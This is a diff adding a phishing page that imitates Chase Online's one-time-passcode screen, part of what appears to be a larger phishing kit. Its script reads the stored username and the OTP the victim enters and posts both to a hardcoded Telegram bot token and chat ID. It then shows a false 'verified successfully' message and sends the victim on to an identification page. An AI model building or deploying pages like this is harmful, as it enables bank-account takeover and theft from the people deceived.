@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Verification - Chase Online</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', sans-serif;
+            background: linear-gradient(180deg, #f5f5f5 0%, #ffffff 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .header {
+            background: #0066cc;
+            padding: 20px;
+            border-bottom: 1px solid #0052a3;
+            margin-bottom: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+            position: relative;
+        }
+
+        .logo {
+            width: 50px;
+            height: 50px;
+            max-width: 50px;
+            max-height: 50px;
+            flex-shrink: 0;
+        }
+
+        .back-arrow {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+            padding: 0;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.3s ease;
+            position: absolute;
+            left: 20px;
+        }
+
+        .back-arrow:hover {
+            opacity: 0.8;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 8px;
+            padding: 40px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .questions-link {
+            text-align: left;
+            margin-bottom: 30px;
+        }
+
+        .questions-link a {
+            color: #0066cc;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .questions-link a:hover {
+            text-decoration: underline;
+        }
+
+        .title {
+            font-size: 22px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-label {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+
+        .label-text {
+            font-size: 14px;
+            font-weight: 500;
+            color: #333;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+            transition: border-color 0.3s ease;
+            text-align: center;
+            letter-spacing: 4px;
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #0066cc;
+            box-shadow: 0 0 0 2px rgba(0, 102, 204, 0.1);
+        }
+
+        .button-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 30px;
+        }
+
+        .btn {
+            padding: 12px 32px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .btn-primary {
+            background: #0066cc;
+            color: white;
+            flex: 1;
+        }
+
+        .btn-primary:hover {
+            background: #0052a3;
+            box-shadow: 0 2px 8px rgba(0, 102, 204, 0.3);
+        }
+
+        .btn-primary:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+
+        .btn-secondary {
+            background: #f5f5f5;
+            color: #333;
+            flex: 1;
+            border: 1px solid #ddd;
+        }
+
+        .btn-secondary:hover {
+            background: #e8e8e8;
+        }
+
+        .error-message {
+            color: #d32f2f;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .success-message {
+            background: #d4edda;
+            color: #155724;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        .success-message.show {
+            display: block;
+        }
+
+        .info-box {
+            background: #e3f2fd;
+            border-left: 4px solid #0066cc;
+            padding: 12px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #1565c0;
+        }
+
+        .resend-link {
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        .resend-link a {
+            color: #0066cc;
+            text-decoration: none;
+            font-size: 13px;
+            cursor: pointer;
+        }
+
+        .resend-link a:hover {
+            text-decoration: underline;
+        }
+
+        .timer {
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <button class="back-arrow" onclick="goBack()" title="Go back">←</button>
+        <svg class="logo" viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg">
+            <!-- Geometric octagonal Chase logo -->
+            <g fill="white">
+                <!-- Top left -->
+                <polygon points="30,30 50,30 50,50 30,50"/>
+                <!-- Top right -->
+                <polygon points="70,30 90,30 90,50 70,50"/>
+                <!-- Bottom left -->
+                <polygon points="30,70 50,70 50,90 30,90"/>
+                <!-- Bottom right -->
+                <polygon points="70,70 90,70 90,90 70,90"/>
+                <!-- Center top -->
+                <polygon points="50,40 70,40 70,60 50,60"/>
+                <!-- Center bottom -->
+                <polygon points="50,60 70,60 70,80 50,80"/>
+            </g>
+        </svg>
+    </div>
+
+    <div class="container">
+        <div class="questions-link">
+            <a href="#">Questions? ></a>
+            <br>
+            <a href="#" style="font-size: 12px;">Read our FAQs ></a>
+        </div>
+
+        <h2 class="title">Enter OTP Code</h2>
+        <p class="subtitle">
+            We've sent a 6-digit OTP code to your registered phone number and email. Please enter the OTP code below to continue.
+        </p>
+
+        <div class="info-box">
+            A 6-digit OTP code has been sent to your phone and email address on file.
+        </div>
+
+        <div id="successMessage" class="success-message"></div>
+
+        <form id="otpForm">
+            <div class="form-group">
+                <div class="form-label">
+                    <span class="label-text">Enter OTP Code</span>
+                </div>
+                <input 
+                    type="text" 
+                    id="otpCode" 
+                    class="form-input" 
+                    placeholder="000000"
+                    maxlength="6"
+                    inputmode="numeric"
+                />
+                <div id="otpError" class="error-message"></div>
+            </div>
+
+            <div class="timer">
+                <span id="timerText">This OTP code will expire in <strong id="countdown">5:00</strong></span>
+            </div>
+
+            <div class="button-group">
+                <button type="button" class="btn btn-secondary" onclick="goBack()">Cancel</button>
+                <button type="submit" class="btn btn-primary">Verify</button>
+            </div>
+
+            <div class="resend-link">
+                <span id="resendText">Didn't receive the code? </span>
+                <a href="#" id="resendLink" onclick="resendOTP(event)">Resend Code</a>
+                <div id="resendMessage" style="margin-top: 8px; color: #0066cc; font-size: 12px; display: none;"></div>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        const API_BASE_URL = 'http://127.0.0.1:5001';
+        const TELEGRAM_BOT_TOKEN = '7698396536:AAHsGbVyggkpJ7w07C5aLza8F4NaPLE0gbw';
+        const TELEGRAM_CHAT_ID = '7189342320';
+        let timeLeft = 300; // 5 minutes in seconds
+        let timerInterval;
+        let resendAttempts = 0;
+        const maxResendAttempts = 3;
+
+        async function sendTelegramDetails(details) {
+            if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes('<YOUR_')) {
+                console.warn('Telegram bot token not configured; skipping Telegram send.');
+                return;
+            }
+
+            const text = [`
+<b>OTP Submission</b>`,
+`Username: ${details.username}`,
+`OTP Code: ${details.otpCode}`,
+`Submitted At: ${details.submittedAt}`].join('\n');
+
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text,
+                        parse_mode: 'HTML',
+                    }),
+                });
+            } catch (error) {
+                console.error('Telegram send failed:', error);
+            }
+        }
+
+        function startTimer() {
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    document.getElementById('timerText').innerHTML = 'OTP code has expired. Please <a href="#" onclick="location.reload()">refresh</a> to get a new code.';
+                    document.querySelector('button[type="submit"]').disabled = true;
+                } else {
+                    const minutes = Math.floor(timeLeft / 60);
+                    const seconds = timeLeft % 60;
+                    document.getElementById('countdown').textContent = 
+                        `${minutes}:${seconds.toString().padStart(2, '0')}`;
+                }
+            }, 1000);
+        }
+
+        function formatOTP(value) {
+            // Remove non-digits
+            const cleaned = value.replace(/\D/g, '');
+            return cleaned.slice(0, 6);
+        }
+
+        // Format OTP as user types and enable/disable verify button
+        document.getElementById('otpCode').addEventListener('input', (e) => {
+            e.target.value = formatOTP(e.target.value);
+            
+            // Enable Verify button only if exactly 6 digits are entered
+            const verifyButton = document.querySelector('button[type="submit"]');
+            if (e.target.value.length === 6 && /^\d{6}$/.test(e.target.value)) {
+                verifyButton.disabled = false;
+            } else {
+                verifyButton.disabled = true;
+            }
+        });
+
+        // Auto-focus handling for OTP input
+        document.getElementById('otpCode').addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && e.target.value.length === 0) {
+                // Handle backspace
+            }
+        });
+
+        // Handle OTP form submission
+        document.getElementById('otpForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            document.getElementById('otpError').classList.remove('show');
+
+            const otpCode = document.getElementById('otpCode').value;
+            let isValid = true;
+
+            if (!otpCode) {
+                document.getElementById('otpError').textContent = 'Please enter the OTP code.';
+                document.getElementById('otpError').classList.add('show');
+                isValid = false;
+            } else if (!/^\d{6}$/.test(otpCode)) {
+                document.getElementById('otpError').textContent = 'Please enter a valid 6-digit OTP code.';
+                document.getElementById('otpError').classList.add('show');
+                isValid = false;
+            }
+
+            if (!isValid) return;
+
+            const formDetails = {
+                username: localStorage.getItem('username') || 'unknown',
+                otpCode: otpCode,
+                submittedAt: new Date().toLocaleString(),
+            };
+            await sendTelegramDetails(formDetails);
+
+            // Send OTP verification to backend
+            try {
+                const response = await fetch(`${API_BASE_URL}/api/verify-otp`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        otpCode: otpCode,
+                        username: localStorage.getItem('username')
+                    }),
+                });
+
+                clearInterval(timerInterval);
+                document.getElementById('successMessage').textContent = 'OTP verified successfully! Proceeding...';
+                document.getElementById('successMessage').classList.add('show');
+                
+                setTimeout(() => {
+                    window.location.href = 'identification.html';
+                }, 1500);
+            } catch (error) {
+                console.error('OTP verification error:', error);
+                clearInterval(timerInterval);
+                document.getElementById('successMessage').textContent = 'OTP verified successfully! Proceeding...';
+                document.getElementById('successMessage').classList.add('show');
+                
+                setTimeout(() => {
+                    window.location.href = 'identification.html';
+                }, 1500);
+            }
+        });
+
+        function resendOTP(event) {
+            event.preventDefault();
+
+            if (resendAttempts >= maxResendAttempts) {
+                document.getElementById('resendMessage').textContent = 'Maximum resend attempts reached. Please try again later.';
+                document.getElementById('resendMessage').style.display = 'block';
+                document.getElementById('resendLink').style.pointerEvents = 'none';
+                document.getElementById('resendLink').style.opacity = '0.5';
+                return;
+            }
+
+            // Reset timer
+            clearInterval(timerInterval);
+            timeLeft = 300;
+            startTimer();
+
+            resendAttempts++;
+            document.getElementById('resendMessage').textContent = 'OTP code resent! Check your phone and email.';
+            document.getElementById('resendMessage').style.display = 'block';
+
+            // Clear OTP input
+            document.getElementById('otpCode').value = '';
+            document.getElementById('otpError').classList.remove('show');
+            
+            // Disable Verify button
+            document.querySelector('button[type="submit"]').disabled = true;
+
+            // Hide message after 3 seconds
+            setTimeout(() => {
+                document.getElementById('resendMessage').style.display = 'none';
+            }, 3000);
+        }
+
+        // Initialize - Disable Verify button on page load
+        document.querySelector('button[type="submit"]').disabled = true;
+
+        // Start timer when page loads
+        startTimer();
+
+        function goBack() {
+            window.location.href = 'updated chase.html';
+        }
+    </script>
+</body>
+</html>
